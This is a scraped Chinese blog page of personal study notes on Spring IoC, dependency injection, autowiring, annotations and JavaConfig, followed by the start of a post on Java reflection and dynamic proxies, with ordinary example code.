重点就是一切交给Spring，一切函数不再由你调用，让Spring调用即可。 4.IOC创建对象​ 1.默认直接创建的时候利用的无参构造方法 ​ 2.有参构造的时候我们有三种方式来对参数进行构造： 123456&lt;!-- 键对值的方式，最简单--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;wuhu&quot;/&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- 用下标来赋值--&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;wuhu&quot;/&gt; &lt;!-- 用类型来赋值，不推荐使用--&gt; 注意事项: ​ 在Spring当中，实际上当我们利用Spring进行Context的创建的时候，Spring已经将全部对象导入 1234ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 接下来我们用Spring的管理即可HelloSpring hello = (HelloSpring) context.getBean(&quot;hello&quot;);System.out.println(hello.tostring()); 也就是说，如果你的Bean当中即使含有多个类，Spring也将他们全部导入并初始化，用户想要什么去取出来即可。 5.Spring的配置 别名(已没用了) Bean的配置 12&lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt; 在这里的id就是注册名，class就是调用类name已经可以取别名了！ Import 便于多人运动，大伙一起开发的时候，就可以将他们包含在一起了~ 1&lt;import resource=&quot;beans.xml&quot;/&gt; 6.DI依赖注入​ 6.1构造方法注入​ 重写构造方法 6.2set方法注入【重点】​ 依赖：beans的对象依赖于容器！ ​ 注入：bead当中的所有属性·，由容器来注入。 【环境搭建】 ​ 1.复杂类型 2.真实测试对象 123456789public class Student &#123; private String string; private String[] book; private List&lt;String&gt; hobbies; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; ​ 3.beans.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!-- 普通注入--&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.ysllz.pojo.HelloSpring&quot; name=&quot;u1,u2&quot;&gt; &lt;constructor-arg name=&quot;str&quot; value=&quot;www&quot;/&gt;&lt;!-- ref注入--&gt; &lt;/bean&gt; &lt;bean id=&quot;address2&quot; class=&quot;com.ysllz.pojo.Address&quot; /&gt; &lt;bean class=&quot;com.ysllz.pojo.Student&quot; id=&quot;student&quot;&gt;&lt;!--数组注入--&gt; &lt;property name=&quot;book&quot;&gt; &lt;array&gt; &lt;value&gt;红楼梦&lt;/value&gt; &lt;value&gt;水浒传&lt;/value&gt; &lt;value&gt;三国演义&lt;/value&gt; &lt;value&gt;西游记&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;!--list注入--&gt; &lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;value&gt;起飞&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;!-- map注入--&gt; &lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;身份证&quot; value=&quot;440000000032001&quot;/&gt; &lt;entry key=&quot;银行卡&quot; value=&quot;2213123032001&quot;/&gt; &lt;/map&gt; &lt;/property&gt;&lt;!-- set注入--&gt; &lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;lol&lt;/value&gt; &lt;value&gt;cod&lt;/value&gt; &lt;value&gt;bot&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;&lt;!-- 配置注入--&gt; &lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; ​ 4.测试类 12345678910public class Mytest &#123; public static void main(String[] args) &#123;// 获取spring的上下文对象 ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);// 接下来我们用Spring的管理即可 Student student = (Student) context.getBean(&quot;student&quot;); System.out.println(student.toString()); &#125;&#125; 6.3其他方法注入P,就是set注入，C就是创造器注入 1.Spring的bean的本质实际上就是反转，注入的值，创建对象全部交给Spring的XML来配置了！实际上就是利用Set注入 回顾昨天的代码： 123456789//我们照样是new 了一个新的对象package com.ys.dao;public class UserSQLServer implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;SQLSERVER use it&quot;); &#125;&#125; 重写DAO层的方法，之后在service层当中进行操作： 12345package com.ys.service;public interface UserService &#123; void getUser();&#125; 写一个实现接口类： 1234567891011121314151617181920package com.ys.service;import com.ys.dao.UserDao;public class UserServiceimpl implements UserService&#123; private UserDao userDao; public UserDao getUserDao() &#123; return userDao; &#125; public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; public void getUser() &#123; this.userDao.getUser(); &#125;&#125; 但是我们这里设置了一个Set方法，让userDao允许用户的自定义创建，那么他需要什么我们就给什么~ 最终测试类： 12345678910111213141516171819import com.ys.dao.UserDao;import com.ys.dao.UserDaoimpl;import com.ys.dao.UserMysql;import com.ys.dao.UserSQLServer;import com.ys.service.UserService;import com.ys.service.UserServiceimpl;public class TestInMine &#123; public static void main(String[] args) &#123;// 用户实际调用的是业务层，Dao层不允许他们接触！ UserServiceimpl userServiceimpl = new UserServiceimpl(); userServiceimpl.setUserDao(new UserSQLServer()); userServiceimpl.getUser();&#125;&#125; 于是在spring当中，spring帮我们操作了什么？ 我们没有NEW任何一个类，我们做的是去Spring的bean下配置xml~ 我们如下构造xml： 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!-- 使用spring来创建我们的对象,在spring中都成为Bean--&gt; &lt;!-- 现在一个Bean相当于new 了一个对象--&gt; &lt;!-- 我们在XML当中去配置了--&gt; &lt;bean id=&quot;userMySQL&quot; class=&quot;com.ys.dao.UserMysql&quot;/&gt; &lt;bean id=&quot;userOranle&quot; class=&quot;com.ys.dao.UserOranle&quot;/&gt; &lt;bean id=&quot;userSQLServer&quot; class=&quot;com.ys.dao.UserSQLServer&quot;/&gt; &lt;bean id=&quot;userServiceimpl&quot; class=&quot;com.ys.service.UserServiceimpl&quot;&gt; &lt;property name=&quot;userDao&quot; ref=&quot;userMySQL&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; bean 就相当于new了这么一个类，ref则是取bean当中已经创建好的类。 所以我们的测试代码修改后为： 1234567891011121314import com.ys.service.UserServiceimpl;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TestInMine &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean1.xml&quot;); UserServiceimpl userServiceimpl = (UserServiceimpl) context.getBean(&quot;userServiceimpl&quot;); userServiceimpl.getUser(); &#125;&#125; 2 IOC创建对象的方式1.使用无参构造 默认创建 123456789101112131415161718192021222324package com.ys.pojo;public class User &#123; private String name;// public User()&#123;//// System.out.println(&quot;wdndmd&quot;);//// &#125; public User(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name:&quot;+name); &#125;&#125; 如果我在这直接将无参构造去除，那么就会出现无法构建的问题，但是Spring也支持使用有参构造 构造器函数有三种方式： 第一种，下标赋值 &lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt; &lt;/bean&gt; 1234567+ 第二种，参数类型匹配+ &#96;&#96;&#96;xml &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; 通过参数名来进行赋值 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;www&quot;/&gt;&lt;/bean&gt; 要注意： 我们如果使用了有参构造，spring就不会走无参构造的方法了 只要我们使用new ClassPathXmlApplicationContext创建，就会把XML当中的类全部注入进去，创建新类 1234567891011121314151617181920package com.ys.pojo;public class UserT &#123; private String name; public UserT()&#123; System.out.println(&quot;userT被创建了&quot;); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public UserT(String name) &#123; this.name = name; &#125;&#125; 例如我们创建该java类 并在bean中扫描： 123&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;user&quot;/&gt;&lt;/bean&gt; 我们便不会得到构造器应该返回那句话，但如果我们去掉上面的 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;/&gt; 则会得到构造器当中的话 同时我们要知道，我们创建的时候是一样的bean，对象并没有区别： 测试代码： 12User user = (User) context.getBean(&quot;user&quot;);User user2 = (User)context.getBean(&quot;user&quot;); 两者是是一样的。 所以在配置文件加载的时候，容器中管理的对象就已经初始化了 3. Spring配置3.1 别名1&lt;alias name=&quot;userT&quot; alias=&quot;dnm&quot;/&gt; 利用这样就可以得到一个别名除此之外，我们也可以通过： 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot; name=&quot;userT2&quot;/&gt; 12345 User user = (User) context.getBean(&quot;user2&quot;); User user2 = (User)context.getBean(&quot;user&quot;); System.out.println(user==user2); user.show();&#125; 测试后是一样的 而且利用name的方式可以起多个别名 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot; name=&quot;user2,u2&quot;&gt; 3.2 Bean的配置3.3 importimport一般被我们用于使用团队开发使用，它可以将多个配置文件导入合并为一个，方便程序员之间互相协作。 例如我先创建了如下三个配置的xml： beans1.xml ,applicationContext.xml 以及beans.xml 在main函数当中我却只想使用一个，该如何操作呢？，这样我们应该： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;import resource=&quot;beans.xml&quot;/&gt; &lt;import resource=&quot;beans1.xml&quot;/&gt; &lt;/beans&gt; 之后再回到Mytest当中： 12ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); 这样就相当于一口气组织了三个xml文件 同时再回到前面的别名的使用，这样的别名便于我们import合并的时候将他们合并在一起，会阻止重复的情况 4 依赖注入（DI）4.1 构造器注入前面已经说过 4.2 SET方式注入【重点】 依赖注入：本质就是set注入！ 依赖什么？ bean对象的创建依赖于容器 注入什么？ bean对象中的所有属性由容器来注入 关于复杂类型之前，我们有必要明白list，set，map都是来做什么的，以及他们的区别 详细我决定写在JAVA基础里面。 【环境搭建】 1.复杂类型 1234567891011public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; 2.真实测试对象 123456789public class Student &#123; private Address address; private String name; private String[] books; private List&lt;Student&gt; hobbies; private Map&lt;String,String&gt; cards; private Set&lt;String&gt; games; private String wife; private Properties info; 这些对象的各种注入方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;!-- Bean注入，使用ref--&gt;&lt;property name=&quot;address&quot; ref=&quot;address1&quot;/&gt;&lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;Java基础&lt;/value&gt; &lt;value&gt;Java进程&lt;/value&gt; &lt;value&gt;Java编写&lt;/value&gt; &lt;value&gt;JavaIOC&lt;/value&gt; &lt;value&gt;JavaSpring&lt;/value&gt; &lt;/array&gt;&lt;/property&gt;&lt;property name=&quot;cards&quot;&gt; &lt;map&gt; &lt;entry key=&quot;月曜&quot; value=&quot;1751111&quot;/&gt; &lt;entry key=&quot;月石&quot; value=&quot;138217&quot;/&gt; &lt;/map&gt;&lt;/property&gt;&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;战地&lt;/value&gt; &lt;value&gt;使命召唤&lt;/value&gt; &lt;value&gt;EA&lt;/value&gt; &lt;value&gt;奥里给&lt;/value&gt; &lt;/set&gt;&lt;/property&gt;&lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;唱歌&lt;/value&gt; &lt;value&gt;下棋&lt;/value&gt; &lt;value&gt;睡觉&lt;/value&gt; &lt;/list&gt;&lt;/property&gt;&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;url&quot;&gt;/weibos?SSL=xxx&lt;/prop&gt; &lt;prop key=&quot;divers&quot;&gt;mysql&lt;/prop&gt; &lt;prop key=&quot;username&quot;&gt;月石&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;月曜&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt;&lt;property name=&quot;wife&quot;&gt; &lt;null/&gt;&lt;/property&gt;&lt;/bean&gt; 我在这里觉得比较重要的区别就是在于prop和map当中的差别 map因为强调的是键值对关系，所以写在map的标签当中，而prop中的值容易修改，所以我们写在标签中间。 总而言之记住就好了 测试结果如下： 123456Student&#123;address=Address&#123;address=&#x27;安徽芜湖中出&#x27;&#125;, name=&#x27;月石&#x27;,books=[Java基础, Java进程, Java编写, JavaIOC, JavaSpring],hobbies=[唱歌, 下棋, 睡觉], cards=&#123;月曜=1751111, 月石=138217&#125;, games=[战地, 使命召唤, EA, 奥里给], wife=&#x27;null&#x27;, info=&#123;password=月曜, url=/weibos?SSL=xxx, divers=mysql, username=月石&#125;&#125; 4.3 拓展方式注入除了上面的依赖注入以外，我们还可以使用P命名空间和C命名空间注入，但是他们必须利用XML约束。 具体例子如下： 123456789&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt; &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;&lt;/bean&gt;&lt;bean class=&quot;com.ys.pojo.User&quot; id=&quot;user2&quot; p:age=&quot;20&quot; p:name=&quot;月曜&quot;/&gt;&lt;bean id=&quot;user3&quot; class=&quot;com.ys.pojo.User&quot; c:age=&quot;21&quot; c:name=&quot;月笙&quot;/&gt; 1234567891011@Testpublic void test()&#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean2.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user2&quot;, User.class); System.out.println(user); System.out.println(user2); User user3 = context.getBean(&quot;user3&quot;, User.class); System.out.println(user3); （想使用test记得导入junit哦 相同的，使用c标签就相当于使用构造器呢。 那么玩什么要使用c标签和p标签呢？ 我猜想是如果我们对这种简单的注入方式统一的使用标签来进行注入，而复杂的使用prop来进行注入，可以简化我们的代码，当xml繁琐的时候也不至于一塌糊涂了把 官方文档： namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time. 意思是不够灵活，同时需要与团队沟通好，但是可以简化代码？ 5 Bean的作用域主要是探讨原型和单例之间的差距： 单例： 之后我们创建的时候即使创建很多个类，依然只有一个原型 多例： 每创建一个新的类都会创建一个新的类 12&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt; 测试代码： 12345User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user&quot;, User.class); System.out.println(user.hashCode()); System.out.println(user2.hashCode()); System.out.println(user==user2); 得到结果： 1231075738627282828951false 6. Bean的自动装配 自动装配是Spring满足bean依赖的一种方式！ Spring会在上下文中自动寻找，并自动给bean装配属性 在Spring中有三种自动装配的方式： 在XML中显式的配置 在Java中显式的配置 隐式的自动装配bean【重要】 6.1 测试环境 一个人有两条狗！ Cat： 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;miao&quot;); &#125;&#125; Dog： 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;wang&quot;); &#125;&#125; Person： 1234567891011121314151617181920212223242526272829303132333435363738public class Person &#123; private Cat cat; private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; beans.xml: byName配置： 123456&lt;bean id=&quot;cat&quot; class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; byType： 123456&lt;bean class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byType&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; byName就是在上下文中寻找id和所需求匹配的值，而byType则是在上下文中去寻找和类型相同类 于是我又产生了一个疑惑，如果存在跨文件的情况呢？ 于是我又创建了一个bean1.xml来储存 123&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;dnm&quot;/&gt;&lt;/bean&gt; 得到结果： 月石 miao wang 但是如果我把beans的注释之后呢 则是 dnm miao wang 这就说明，当我们使用beans.xml装配之后，系统会优先在当前xml来进行查找，之后才会去其他地方查找 除此之外我们需要记住： 当我们使用byName的时候，必须保证当前bean的id唯一且正确 当我们使用byType的时候，必须保证当前bean的class唯一且正确 6.2使用注解实现自动装配jdk1.5支持，spring2.5支持 使用注解须知： 导入约束 配置注解的支持 必须导入如下配置： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; 之后我们便可以对单个值进行注入。 在Person类当中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ys.pojo;import org.springframework.beans.factory.annotation.Autowired;public class Person &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 当我们使用atuowired注入之后，甚至连set方法都不需要构造了，为什么呢？ 【据说是因为他利用反射的方式获取代码，我也不是很懂 如果bean当中的配置多起来了，我们想构造的话，就需要通过 1@Qualifier(value = &quot;cat&quot;) 显式的定义代码 7.注解开发在Spring4之后，我们必须保证Spring的AOP包被导入 在使用注解的时候需要导入context约束，增加注解的支持 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; bean 当我们使用注解之后，bean可以如下方法进入导入： 第一步，导入包： 12&lt;context:annotation-config/&gt;&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; 第二步，去类的上面添加注释： 12345678910111213@Componentpublic class User &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 注意@Component，这个注解的意思等价于 1&lt;bean id=&#x27;user&#x27; class=com.ys.pojo.user&gt; 属性如何注入 使用类我们也是可以注入值的： 123public class User &#123; @Value(&quot;月石&quot;) private String name; 等价于： 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; 但是通过这我们就可以明白，注解注入值不适合注入复杂类型的值。 衍生的注解 通过@Component后面为了分层，我们衍生出了如下注解： Dao: @Repository Service: @Service Controller: @Controller 这四个类的本质都没有区别，都代表注册一个bean去XML当中，只不过这样写可以使得我们MVC架构更加清晰明了 自动装配 123- @Atuowired: 自动装配- @Nullable： 允许字段为null- @Resource ：通过名字，类型自动装配 作用域 其实通过注解也可以对作用域进行注解，但是我觉得不是很方便。 1@Scope() 为什么不通过XML呢？ 小结 在这章我们学会了利用注解进行开发，可以通过注解摆脱XML，但是我通过学习这一章节，我感觉Spring此时还是不够成熟，大部分的时候还是利用XML更加方便，复杂的东西丢给XML来做，简单的利用注解注入就行 所以最佳实践应该是： 利用XML手动的建立每个bean，这样方便程序员的互相合作 XML注入MAP类型等 利用注释手动的注入简单值，降低开发成本 同时我们还需要了解： XML的优势就在于他更加清楚明了，起码在Spring来说是这样的，同时XML还方便跨文件配合 而注解更加的方便我们进行开发，注入值，降低程序员的成本（但是增加了运维的难度 使用注解开发的一个简单例子，还是一个人两个宠物： 🐱的代码： 12345678910package com.ys.pojo;import org.springframework.stereotype.Component;@Componentpublic class Cat &#123; public void shout()&#123; System.out.println(&quot;🐱：wdnmd&quot;); &#125;&#125; 🐕的代码： 12345678910package com.ys.pojo;org.springframework.stereotype.Component;@Componentpublic class Dog &#123; public void shout()&#123; System.out.println(&quot;🐕：wdnmd&quot;); &#125;&#125; 人的代码： 1234567891011121314151617181920212223242526272829303132@Componentpublic class User &#123; @Value(&quot;月石&quot;) private String name; @Autowired private Cat cat; @Autowired private Dog dog; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125;&#125; 测试代码： 1234567891011public class Mytest &#123; public static void main(String[] args) &#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); System.out.println(user.getName()); user.getCat().shout(); user.getDog().shout(); &#125;&#125; 依然能够正常的得到结果~ 8 完全使用Java配置Spring我们现在要完全使用Javaconfig完全的代替XML了，SpringBoot当中也是这样做的，我还是有点慌，感觉没有能够适应过来 还是很有必要将XML的方式和Java类的方式进行对比，如果我们想要使用Javaconfig来代替XML 构造如下Java代码: 123456789@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125;&#125; 我们使用@Configuration的意思等同于： 1&lt;beans &gt;&lt;/beans&gt; 之后我们所有的配置都可以写在该类当中 @Component(“com.ys.pojo”)类等同于如下代码： 1&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; 将两者之间进行进一步的对比，如果我们想要配置一个类的话： 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;/&gt; 这个XML标签等同于： 1234@Beanpublic User user()&#123; return new User();&#125; 那如何注入值呢？ 在XML当中我们是这样操作的： 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; 而到了Javaconfig之中： 123public class User &#123; @Value(&quot;月石&quot;) public String name; 我们选择直接由类来注入值！ 而Autowired依然没有变化，还是直接在包中寻找上下文的类~，比如我们尝试继续学习举例，一个人有一只猫和一个狗: 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;🐱说：wdnmdb&quot;); &#125;&#125; 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;🐕说：wndmd&quot;); &#125;&#125; 当我们使用这种方式来创建之后，就没有地方来使用@Component这个注解了，因为我们没有XML呢？ 总而言之我必须与做出这样的JavaConfig代码： 123456789101112131415161718@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125; @Bean public Cat cat()&#123; return new Cat(); &#125; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; 而我们的@Component就没有什么用武之地了..","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Java动态代理","slug":"Java动态代理","date":"2020-11-10T11:42:16.000Z","updated":"2020-11-10T12:50:37.496Z","comments":true,"path":"2020/11/10/Java动态代理/","link":"","permalink":"http://example.com/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"Java动态代理再当前的Java代码中几乎随处可见，因为它既可以获取Java静态代理的可拓展性，并且它也可以让我们的代码变得并不繁琐，除此之外，正是由于Java的动态代理原理是反射，故还会引出很多安全问题，我们要知道，Java的反射本身就是不安全的一件事（Private首先就变得毫无意义了） 话说回来，想要学习好动态代理，反射的学习是必不可免的，如果没有学习过我建议先学习反射，这里将一些API写罗列出来，方便没有学过反射，或者对反射并不熟悉的读者可以阅读后面的文章 反射APIgetClass[一个实例对象].getClass ,将返回实例的类，我这里用如下代码进行演示： 例子： 123456789101112131415161718192021222324252627import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass()); &#125;;&#125;class myDemo&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;;&#125; 当前代码的输出结果为： 我们可以很清楚的发现，获取了该对象 getclass().getInterfaces()其实我们读名字也可以很清楚的明白它的用途了，用于获取当前的继承的接口 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getInterfaces()); &#125;;&#125;interface bark&#123; void jiao();&#125;class myDemo implements bark&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;; public void jiao() &#123; System.out.println(&quot;jiao&quot;); &#125;&#125; 返回结果为： 1[Ljava.lang.Class;@7f31245a 这里便得到了类的接口了，只不过这里是以流的方式进行传输 getClass().getName()这样的也很简单理解，我们即使getClass了，程序却不知道它的名字，程序只知道是一个类，故我们使用getName即可得到当前实例的类的名字（String形式） 1234567public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getName()); &#125;; 好像写一个动态代理也就用到了这些，嘛，继续往下吧 动态代理2.1 接口首先和静态代理是一样的，我们也需要构筑一个接口： 123456789package myProxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; 同样的，业务实体是不可避免的 2.2实体类：12345678910111213141516171819package myProxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;增添了一个新用户&quot;); &#125; public void delete() &#123; System.out.println(&quot;删除了一个用户&quot;); &#125; public void update() &#123; System.out.println(&quot;更新了一个用户&quot;); &#125; public void query() &#123; System.out.println(&quot;查询了一个用户&quot;); &#125;&#125; 而代理类，通过动态代理我们可以直接的生成，取消繁琐的操作 如果用静态代理，我们的代理是这样的： 12345678910111213141516171819202122232425262728293031323334package myProxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; 